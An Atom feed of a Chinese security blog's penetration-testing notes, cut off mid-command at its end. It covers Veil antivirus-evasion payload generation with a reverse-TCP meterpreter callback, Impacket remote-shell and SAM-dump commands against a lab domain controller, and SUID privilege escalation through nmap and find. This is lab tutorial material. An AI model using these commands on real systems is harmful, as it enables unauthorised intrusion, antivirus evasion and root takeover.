<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2021-08-29T03:53:22.101Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS基本命令</title>
    <link href="http://bai-ren-1.github.io/2021/08/29/CS%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    <id>http://bai-ren-1.github.io/2021/08/29/CS%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</id>
    <published>2021-08-29T03:50:50.000Z</published>
    <updated>2021-08-29T03:53:22.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CS基本命令"><a href="#CS基本命令" class="headerlink" title="CS基本命令"></a>CS基本命令</h1><p>转载优秀文章做记录。</p><h2 id="0x00-转载链接"><a href="#0x00-转载链接" class="headerlink" title="0x00 转载链接"></a>0x00 转载链接</h2><p>全网最全的Cobalt Strike使用教程系列-基础篇：<a href="https://mp.weixin.qq.com/s/O4BdxVU3dFgGrZ1VLfdngQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/O4BdxVU3dFgGrZ1VLfdngQ</a></p><p>全网最全的Cobalt Strike使用教程-进阶篇（上）：<a href="https://mp.weixin.qq.com/s/bYTIRn5qa0hNeUCKKYdxRQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/bYTIRn5qa0hNeUCKKYdxRQ</a></p><p>全网最全的Cobalt Strike使用教程-进阶篇（下）：<a href="https://mp.weixin.qq.com/s/NkdaVR7xCe7f90gCBJBaog" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NkdaVR7xCe7f90gCBJBaog</a></p><p>全网最全的Cobalt Strike使用教程-内网渗透之信息收集篇：<a href="https://mp.weixin.qq.com/s/_1c7JzHFt33TDUYGSYupLw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_1c7JzHFt33TDUYGSYupLw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CS基本命令&quot;&gt;&lt;a href=&quot;#CS基本命令&quot; class=&quot;headerlink&quot; title=&quot;CS基本命令&quot;&gt;&lt;/a&gt;CS基本命令&lt;/h1&gt;&lt;p&gt;转载优秀文章做记录。&lt;/p&gt;
&lt;h2 id=&quot;0x00-转载链接&quot;&gt;&lt;a href=&quot;#0x00-转载链接&quot;
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Veil基本使用</title>
    <link href="http://bai-ren-1.github.io/2021/08/25/Veil%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://bai-ren-1.github.io/2021/08/25/Veil%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2021-08-25T04:04:56.000Z</published>
    <updated>2021-08-26T03:11:38.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Veil基本使用"><a href="#Veil基本使用" class="headerlink" title="Veil基本使用"></a>Veil基本使用</h1><p>免杀框架，简单记录。</p><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><p>直接使用Kali安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt -y install veil</span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure><h2 id="0x02-基本命令"><a href="#0x02-基本命令" class="headerlink" title="0x02 基本命令"></a>0x02 基本命令</h2><p>基本命令与MSF比较类似：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">veil</span><br><span class="line">Veil&gt;: use Evasion</span><br><span class="line">Veil/Evasion&gt;: list<span class="comment"># 列出所有payload</span></span><br><span class="line">Veil/Evasion&gt;: use 7<span class="comment"># 使用第七个payload</span></span><br><span class="line">[c/meterpreter/rev_tcp&gt;&gt;]: <span class="built_in">set</span> LHOST 192.168.20.148<span class="comment"># 设置攻击机的ip 端口信息</span></span><br><span class="line">[c/meterpreter/rev_tcp&gt;&gt;]: <span class="built_in">set</span> LPORT 7777</span><br><span class="line">[c/meterpreter/rev_tcp&gt;&gt;]: generate <span class="comment"># 生成payload</span></span><br></pre></td></tr></table></figure><p>执行命令后生成payload和exe：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Language: c</span><br><span class="line">[*] Payload Module: c/meterpreter/rev_tcp</span><br><span class="line">[*] Executable written to: /var/lib/veil/output/compiled/my2.exe</span><br><span class="line">[*] Source code written to: /var/lib/veil/output/<span class="built_in">source</span>/my2.c</span><br><span class="line">[*] Metasploit Resource file written to: /var/lib/veil/output/handlers/my2.rc</span><br></pre></td></tr></table></figure><p>执行后生成了不同格式的文件。</p><h3 id="MSF文件"><a href="#MSF文件" class="headerlink" title="MSF文件"></a>MSF文件</h3><p>将rc文件也就是刚刚生成的 /var/lib/veil/output/handlers/my2.rc，导入到MSF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ msfconsole -r /var/lib/veil/output/handlers/my2.rc</span><br></pre></td></tr></table></figure><p>然后按平时监听，等靶机运行后上线就行。</p><h3 id="EXE文件"><a href="#EXE文件" class="headerlink" title="EXE文件"></a>EXE文件</h3><p>直接放在靶机上运行。</p><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><p>自己编译。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Veil基本使用&quot;&gt;&lt;a href=&quot;#Veil基本使用&quot; class=&quot;headerlink&quot; title=&quot;Veil基本使用&quot;&gt;&lt;/a&gt;Veil基本使用&lt;/h1&gt;&lt;p&gt;免杀框架，简单记录。&lt;/p&gt;
&lt;h2 id=&quot;0x01-安装&quot;&gt;&lt;a href=&quot;#0x01
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>MSF启动报错</title>
    <link href="http://bai-ren-1.github.io/2021/08/24/MSF%E5%90%AF%E5%8A%A8%E6%8A%A5%E9%94%99/"/>
    <id>http://bai-ren-1.github.io/2021/08/24/MSF%E5%90%AF%E5%8A%A8%E6%8A%A5%E9%94%99/</id>
    <published>2021-08-24T11:35:17.000Z</published>
    <updated>2021-08-24T11:38:02.788Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MSF启动报错"><a href="#MSF启动报错" class="headerlink" title="MSF启动报错"></a>MSF启动报错</h1><p>msfconsole启动报错，原因是确实新版本的某些依赖。</p><h2 id="0x00-解决措施"><a href="#0x00-解决措施" class="headerlink" title="0x00 解决措施"></a>0x00 解决措施</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gem update --system         <span class="comment"># 更新gem</span></span><br><span class="line">gem install bundler -v 2.2.4        <span class="comment">#  gem版本一定要和bundler版本对应，否则报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖包</span></span><br><span class="line">apt-get install ruby-dev</span><br><span class="line">apt-get install postgresql</span><br><span class="line">apt-get install libpcap-dev</span><br><span class="line">apt-get install oracle*</span><br><span class="line">apt-get install libsqlite3-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装bundle</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>安装完即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MSF启动报错&quot;&gt;&lt;a href=&quot;#MSF启动报错&quot; class=&quot;headerlink&quot; title=&quot;MSF启动报错&quot;&gt;&lt;/a&gt;MSF启动报错&lt;/h1&gt;&lt;p&gt;msfconsole启动报错，原因是确实新版本的某些依赖。&lt;/p&gt;
&lt;h2 id=&quot;0x00-解决措
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Impacket工具包</title>
    <link href="http://bai-ren-1.github.io/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/"/>
    <id>http://bai-ren-1.github.io/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/</id>
    <published>2021-08-18T03:50:01.000Z</published>
    <updated>2021-08-18T04:06:14.742Z</updated>
    
    <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="Impacket工具包"><a href="#Impacket工具包" class="headerlink" title="Impacket工具包"></a>Impacket工具包</h1><p>转载自：<a href="https://www.freebuf.com/sectool/175208.html。" target="_blank" rel="noopener">https://www.freebuf.com/sectool/175208.html。</a></p><p>Impacket是一个Python类库，用于对SMB1-3或IPv4 / IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。** </p><p>在本文的实验场景中，我们需要准备以下两个系统：</p><blockquote><p>配置域控的Windows服务器；</p><p>Kali Linux；</p></blockquote><p>系统相关设置如下：</p><h3 id="Windows-Server"><a href="#Windows-Server" class="headerlink" title="Windows Server"></a>Windows Server</h3><blockquote><p>域: SERVER；</p><p>用户: Administrator；</p><p>密码: T00r；</p><p>IP地址: 192.168.1.140；</p><p><strong>Kali Linux:</strong> 192.168.1.135；</p></blockquote><p>在正式开始使用Impacket工具之前，让我们先对目标Windows服务器执行Nmap版本扫描，以获取当前Windows Server上运行的有关服务信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.140</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/1.png" alt></p><p>正如你在上面的截图中看到的，目标系统当前运行的服务有域服务，Kerberos服务，Netbios服务，LDAP服务和Windows RPC服务。</p><p>现在让我们从GitHub安装Impacket工具。你可以在<a href="https://github.com/CoreSecurity/impacket.git" target="_blank" rel="noopener">这里</a>获取到。</p><p>首先，我们通过git clone命令克隆存储库，然后按以下截图所示安装Impacket。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/2.png" alt></p><p>这将在你的Kali Linux上安装Impacket。安装完成后，我们来查看下Impacket中都有哪些工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd impacket/examples</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/3.png" alt></p><p>可以看到其中包含了许多的python脚本工具，让我们来尝试使用其中的一些工具：</p><h3 id="Ping-py"><a href="#Ping-py" class="headerlink" title="Ping.py"></a><strong>Ping.py</strong></h3><p>一个简单的ICMP ping脚本，使用ICMP echo和echo-reply数据包检查主机状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ping.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/4.png" alt></p><p><strong>语法: .</strong>/ping.py [Source IP] [Destination IP]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ping.py 192.168.1.135 192.168.1.140</span><br></pre></td></tr></table></figure><p>以下是我从192.168.1.140（Windows Server）获得的ICMP响应</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/5.png" alt></p><h3 id="Lookupsid-py"><a href="#Lookupsid-py" class="headerlink" title="Lookupsid.py"></a><strong>Lookupsid.py</strong></h3><p>通过[MS-LSAT] MSRPC接口的Windows SID bruteforcer示例，旨在查找远程用户/组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lookupsid.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/6.png" alt></p><p><strong>语法:</strong> ./lookupsid.py [[domain/] username [: password] @] [Target IP Address]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lookupsid.py SERVER/Administrator: T00r@192.168.1.140</span><br></pre></td></tr></table></figure><p>如下所示，lookupsid.py已成功为我提取到了目标服务器的用户和组信息</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/7.png" alt></p><h3 id="Psexec-py"><a href="#Psexec-py" class="headerlink" title="Psexec.py"></a><strong>Psexec.py</strong></h3><p>Psexec.py允许你在远程Windows系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程shell命令（不需要安装任何客户端软件）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./psexec.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/8.png" alt></p><p><strong>语法:</strong> ./psexec.py [[domain/] username [: password] @] [Target IP Address]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./psexec.py SERVER/Administrator: T00r@192.168.1.140</span><br></pre></td></tr></table></figure><p>如下所示，我获取到了目标服务器的远程shell</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/9.png" alt></p><h3 id="Rpcdump-py"><a href="#Rpcdump-py" class="headerlink" title="Rpcdump.py"></a><strong>Rpcdump.py</strong></h3><p>该脚本将转储在目标上注册的RPC端点和字符串bindings列表。它也会尝试将它们与一些知名的端点进行匹配。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpcdump.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/10.png" alt></p><p><strong>语法:</strong> ./rpcdump.py [[domain/] username [: password] @] [Target IP Address]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpcdump.py SERVER/Administrator: T00r@192.168.1.140</span><br></pre></td></tr></table></figure><p>如下所示，我成功获取到了目标RPC列表</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/11.png" alt></p><p><strong>Samrdump.py</strong></p><p>与MSRPC套件中的安全帐户管理器远程接口通信的应用程序。它将为我们列出目标系统上的用户帐户，可用资源共享以及通过此服务导出的其他敏感信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./samrdump.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/12.png" alt></p><p><strong>语法:</strong> ./samrdump.py [[domain/] username [: password] @] [Target IP Address]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./samrdump.py SERVER/Administrator: T00r@192.168.1.140</span><br></pre></td></tr></table></figure><p>如下所示，我从目标服务器提取了SAM信息</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/13.png" alt></p><h3 id="Sniff-py"><a href="#Sniff-py" class="headerlink" title="Sniff.py"></a><strong>Sniff.py</strong></h3><p>一个简单的数据包嗅探脚本。使用pcapy库来侦听通过指定接口传输的数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /sniff.py</span><br></pre></td></tr></table></figure><p>选择正确的网卡，并开始嗅探</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/14.png" alt></p><h3 id="Sniffer-py"><a href="#Sniffer-py" class="headerlink" title="Sniffer.py"></a><strong>Sniffer.py</strong></h3><p>一个简单的数据包嗅探脚本，使用原始套接字来侦听与指定协议相对应的传输数据包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /sniffer.py</span><br></pre></td></tr></table></figure><p> sniffer开始监听icmp, tcp和udp数据包</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/15.png" alt></p><h3 id="Wmiexec-py"><a href="#Wmiexec-py" class="headerlink" title="Wmiexec.py"></a><strong>Wmiexec.py</strong></h3><p>它会生成一个使用Windows Management Instrumentation的半交互式shell，并以管理员身份运行。你不需要在目标服务器上安装任何的服务/代理，因此它非常的隐蔽。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wmiexec.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/16.png" alt></p><p><strong>语法:</strong> ./wmiexec.py [[domain/] username [: password] @] [Target IP Address]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wmiexec.py SERVER/Administrator: T00r@192.168.1.140</span><br></pre></td></tr></table></figure><p>如下所示，我获取到了目标服务器的shell</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/17.png" alt></p><h3 id="Wmiquery-py"><a href="#Wmiquery-py" class="headerlink" title="Wmiquery.py"></a><strong>Wmiquery.py</strong></h3><p>它允许发出WQL查询并获取目标系统WMI对象的描述信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wmiquery.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/18.png" alt></p><p><strong>语法:</strong> ./wmiquery.py [[domain/] username [: password] @] [Target IP Address]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wmiquery.py SERVER/Administrator: T00r@192.168.1.140</span><br></pre></td></tr></table></figure><p>这将打开一个shell，你可以在其中执行WQL查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Win32_LogicalDisk WHERE FreeSpace &lt; 209152</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/19.png" alt></p><h3 id="Atexec-py"><a href="#Atexec-py" class="headerlink" title="Atexec.py"></a><strong>Atexec.py</strong></h3><p>通过Task Scheduler服务在目标系统上执行命令，并返回输出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./atexec.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/20.png" alt></p><p><strong>语法:</strong> /atexec.py [[domain/] username [: password] @] [Target IP Address] [Command]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./atexec.py SERVER/Administrator: T00r@192.168.1.140 systeminfo</span><br></pre></td></tr></table></figure><p>如下所示，我与目标服务器建立了远程连接，并执行了systeminfo命令，输出结果显示在了我的Kali终端上。</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/21.png" alt></p><h3 id="getArch-py"><a href="#getArch-py" class="headerlink" title="getArch.py"></a><strong>getArch.py</strong></h3><p>该脚本将连接目标（或目标列表上的）计算机，并使用已记录的MSRPC特征收集由（ab）安装的操作系统架构类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./getArch.py</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/22.png" alt></p><p><strong>语法:</strong> ./getArch.py -target [IP Address]</p><p><strong>命令:</strong> ./getArch.py -target 192.168.1.140</p><p>所下所示，目标系统架构为64-bit</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/23.png" alt></p><h3 id="Ifmap"><a href="#Ifmap" class="headerlink" title="Ifmap"></a><strong>Ifmap</strong></h3><p>该脚本将绑定到目标的MGMT接口，以获取接口ID列表。它将在另一个接口UUID列表的顶部使用该列表，并报告该接口是否被列出和/或处于侦听状态。</p><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/24.png" alt></p><p><strong>语法:</strong> ./ifmap.py [Host IP Address] [Port]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ifmap.py 192.168.1.140 135</span><br><span class="line">./ifmap.py 192.168.1.140 49154</span><br></pre></td></tr></table></figure><p><img src="/2021/08/18/Impacket%E5%B7%A5%E5%85%B7%E5%8C%85/25.png" alt></p><p> <strong>*参考来源：<a href="http://www.hackingarticles.in/beginner-guide-to-impacket-tool-kit/" target="_blank" rel="noopener">hackingarticles</a>，FB小编 secist 编译，转载请注明来自FreeBuf.COM</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;Impacket工具包&quot;&gt;&lt;a href=&quot;#Impacket工具包&quot; class=&quot;headerlink&quot; title=&quot;Impacket工具包&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Beef</title>
    <link href="http://bai-ren-1.github.io/2021/08/18/Beef/"/>
    <id>http://bai-ren-1.github.io/2021/08/18/Beef/</id>
    <published>2021-08-18T03:43:12.000Z</published>
    <updated>2021-08-18T03:44:13.836Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Beef"><a href="#Beef" class="headerlink" title="Beef"></a>Beef</h1><p>老XSS平台，实验了一下。</p><h2 id="0x00-记录"><a href="#0x00-记录" class="headerlink" title="0x00 记录"></a>0x00 记录</h2><p><a href="https://www.freebuf.com/sectool/273343.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/273343.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Beef&quot;&gt;&lt;a href=&quot;#Beef&quot; class=&quot;headerlink&quot; title=&quot;Beef&quot;&gt;&lt;/a&gt;Beef&lt;/h1&gt;&lt;p&gt;老XSS平台，实验了一下。&lt;/p&gt;
&lt;h2 id=&quot;0x00-记录&quot;&gt;&lt;a href=&quot;#0x00-记录&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SUID提权</title>
    <link href="http://bai-ren-1.github.io/2021/07/27/SUID%E6%8F%90%E6%9D%83/"/>
    <id>http://bai-ren-1.github.io/2021/07/27/SUID%E6%8F%90%E6%9D%83/</id>
    <published>2021-07-27T08:15:10.000Z</published>
    <updated>2021-07-27T08:37:40.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>转载自链接：<a href="https://www.freebuf.com/articles/web/272617.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/272617.html</a></p><h2 id="0x00-SUID概述"><a href="#0x00-SUID概述" class="headerlink" title="0x00 SUID概述"></a>0x00 SUID概述</h2><p>SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，<strong>进程的属主不是发起者，而是程序文件所属的属主</strong>。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。</p><p>在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效。</p><blockquote><p>通俗的来讲,假设我们现在有一个可执行文件<code>ls</code>,其属主为root,当我们通过非root用户登录时,如果<code>ls</code>设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限. </p></blockquote><h2 id="0x01-SUID设置"><a href="#0x01-SUID设置" class="headerlink" title="0x01 SUID设置"></a>0x01 SUID设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename   设置SUID位</span><br><span class="line">chmod u<span class="_">-s</span> filename   去掉SUID设置</span><br></pre></td></tr></table></figure><p>举一个设置SUID实例，通过 <code>ls -al</code>查看文件权限：</p><p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/1.jpg" alt></p><p>执行 <code>chmod u+s binexec</code> 设置SUID位：</p><p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/3.jpg" alt></p><p>可以看到<code>binexec</code>文件的权限描述符由<code>-rwxr-xr-x</code>变为<code>-rwsr-xr-x</code>，这代表该文件已经获得了suid权限</p><h2 id="0x02-SUID提权"><a href="#0x02-SUID提权" class="headerlink" title="0x02 SUID提权"></a>0x02 SUID提权</h2><p>即“<strong>通过root设置的具有SUID权限的二进制可执行文件提权</strong>”， 现在已知的具有SUID权限的二进制可执行文件大体有如下这些 ：</p><ul><li>nmap </li><li>vim </li><li>find </li><li>bash </li><li>more </li><li>less </li><li>nano </li><li>cp </li><li>awk </li></ul><p>通过以下命令可以<strong>找到正在系统上运行的所有SUID可执行文件</strong>。准确的说，这个命令将从/目录中查找<strong>具有SUID权限位且属主为root</strong>的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/4.jpg" alt></p><p>以上所有的二进制文件都将以root权限运行 我们随便找一个：</p><p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/5.jpg" alt></p><p> 可以看到其设置了suid权限且属主为root，<strong>符合我们的利用条件</strong>。</p><h2 id="0x03-具体操作"><a href="#0x03-具体操作" class="headerlink" title="0x03 具体操作"></a>0x03 具体操作</h2><h3 id="00-nmap"><a href="#00-nmap" class="headerlink" title="00 nmap"></a>00 nmap</h3><blockquote><p> 适用版本:nmap2.02至5.21 </p></blockquote><p>在早期nmap版本中,带有交互模式,因而允许用户执行shell命令，使用如下命令进入nmap交互模式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure><p>在nmap交互模式中 通过如下命令提权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="01-find"><a href="#01-find" class="headerlink" title="01 find"></a>01 find</h3><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch anyfile <span class="comment">#必须要有这个文件</span></span><br><span class="line">find anyfile -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/6.jpg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入shell</span></span><br><span class="line">find anyfile -<span class="built_in">exec</span> <span class="string">'/bin/sh'</span> 